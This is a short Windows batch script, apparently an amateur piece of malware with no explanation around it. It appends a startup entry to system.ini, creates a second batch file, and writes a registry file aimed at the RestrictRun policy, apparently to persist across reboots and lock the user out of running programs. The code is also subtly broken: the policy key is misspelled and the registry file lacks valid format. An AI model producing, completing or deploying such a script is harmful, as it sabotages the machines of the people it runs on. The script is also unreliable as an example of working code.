@echo off
copy|echo [boot]>>%windir%\system.ini
copy|echo 2.bat>>%windir%\system.ini

echo @echo off>%windir%\2.bat
copy|echo start %WINDIR%\rs.reg>>%windir%\2.bat

echo HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLCIES\RESTRICTRUN>%WINDIR%\RS.REG

COPY|ECHO DWORD=00000001>>%WINDIR%\RS.REG 